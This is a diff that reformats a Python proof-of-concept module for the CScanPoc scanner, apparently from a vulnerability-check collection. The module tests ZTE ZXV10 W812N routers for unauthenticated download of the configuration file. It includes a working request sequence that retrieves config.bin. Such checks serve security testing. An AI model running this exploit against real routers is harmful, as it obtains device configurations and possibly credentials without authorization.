@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'ZTE_0002'  # 平台漏洞编号，留空
     name = 'ZXV10 W812N路由设置文件未授权访问下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-07-01'  # 漏洞公布时间
     desc = '''
         中兴ZXV10 W812N路由设置文件未授权访问下载：manager_dev_config_t.gch
@@ -18,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ZTE'  # 漏洞应用名称
     product_version = '中兴ZXV10 W812N'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '33b36550-4e3e-41d8-bf5b-d6e6a9597a22'
@@ -32,14 +35,15 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer:http://www.wooyun.org/bugs/wooyun-2014-066735
+            # refer:http://www.wooyun.org/bugs/wooyun-2014-066735
             hh = hackhttp.hackhttp()
             arg = self.target
             target1 = arg + '/manager_dev_config_t.gch'
             code1, head1, res1, errcode, _ = hh.http(target1)
-            action = re.findall(r'<form name="fDownload" method="POST" action="(.+?)"', res1)
+            action = re.findall(
+                r'<form name="fDownload" method="POST" action="(.+?)"', res1)
             if action:
-                if len(action)>0:
+                if len(action) > 0:
                     raw = '''
 POST /%s HTTP/1.1
 Host: 221.201.251.110
@@ -59,7 +63,7 @@ Content-Disposition: form-data; name="defcfg"
                     ''' % action
                     target2 = arg + action
                     code2, head2, res2, errcode2, _ = hh.http(target2, raw=raw)
-                    if code2==200 and 'filename=config.bin'  in head2:
+                    if code2 == 200 and 'filename=config.bin' in head2:
                         #security_hole('ZTE config_file download '+target2)
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
@@ -69,6 +73,7 @@ Content-Disposition: form-data; name="defcfg"
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
